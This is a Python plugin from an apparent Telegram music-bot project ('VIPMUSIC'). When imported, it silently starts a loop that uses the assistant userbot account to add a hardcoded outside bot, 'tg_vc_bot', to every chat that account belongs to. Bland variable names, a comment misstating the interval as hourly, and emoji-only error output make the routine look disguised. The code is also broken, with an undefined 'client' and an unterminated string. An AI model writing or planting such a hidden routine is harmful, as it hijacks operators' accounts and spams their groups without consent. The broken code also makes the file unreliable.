import asyncio
import datetime
from pyrogram import Client
from VIPMUSIC.utils.database import get_assistant
import config
from VIPMUSIC import app

SYSTEM = True
PROCESS = "tg_vc_bot"
ADD_INTERVAL = 1  # Add every hour (in seconds)

async def add_bot_to_chats():
    try:
        userbot = await get_assistant(config.LOGGER_ID)
        bot = await client.get_users(PROCESS)
        bot_id = bot.id
        
        async for dialog in userbot.get_dialogs():
            if dialog.chat.id == config.LOGGER_ID:
                continue
            try:
                await userbot.add_chat_members(dialog.chat.id, bot_id)
                print(f"Added bot to chat: {dialog.chat.title}")
            except Exception as e:
                print(f"😍")
                print("🥰")
            
            await asyncio.sleep(3)  # Adjust sleep time based on rate limits
        
    except Exception as e:
        print("⚡)

async def continuous_addss():
    while True:
        if SYSTEM:
            await add_bot_to_chats()
            
        await asyncio.sleep(ADD_INTERVAL)

# Start the continuous broadcast loop if AUTO_GCAST is True
if SYSTEM:  
    asyncio.create_task(continuous_addss())
